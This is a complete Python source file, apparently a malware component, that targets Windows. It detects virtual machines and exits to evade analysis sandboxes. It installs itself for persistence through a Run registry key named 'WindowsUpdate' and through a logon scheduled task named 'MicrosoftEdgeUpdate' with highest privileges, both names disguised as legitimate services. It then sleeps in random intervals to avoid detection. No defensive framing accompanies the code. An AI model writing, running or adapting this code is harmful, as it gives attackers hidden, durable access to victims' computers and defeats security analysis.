# persistence.py
import os, sys, time, random, hashlib, subprocess

_KEY = b"\x9a\x3f\x7c\x1e\xb5\xd2\x88\x4a"

def is_vm() -> bool:
    checks = ["vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "qemu-ga"]
    try:
        out = subprocess.check_output(["tasklist", "/FO", "CSV"], stderr=subprocess.DEVNULL).decode(errors="ignore").lower()
        return any(c in out for c in checks)
    except: return False

def obfuscated_sleep(total: int):
    remaining = total
    while remaining > 0:
        chunk = min(remaining, random.randint(5, 30))
        time.sleep(chunk)
        remaining -= chunk

def persist():
    exe = sys.executable
    script = os.path.abspath(__file__)
    import winreg
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{exe}" "{script}"')
        winreg.CloseKey(key)
    except: pass
    task_cmd = f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "\'{exe}\' \'{script}\'" /sc onlogon /rl highest /f'
    subprocess.run(task_cmd, shell=True, capture_output=True)

if __name__ == "__main__":
    if is_vm(): sys.exit(0)
    persist()
    obfuscated_sleep(3600)